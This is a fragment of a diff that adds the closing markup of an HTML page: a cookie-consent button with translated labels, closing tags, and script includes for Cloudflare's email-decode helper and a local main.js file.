+                    <span class="cookie-action__label" data-i18n="cookie_accept_title">Full Memory</span>
+                    <span class="cookie-action__desc" data-i18n="cookie_accept_desc">Sync your language across sessions for seamless launches.</span>
+                </button>
+            </div>
+        </div>
+    </div>
+    </div>
+
+            <script data-cfasync="false" src="./cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="./assets/js/main.js" defer></script>
+
+   </body>
+</html>
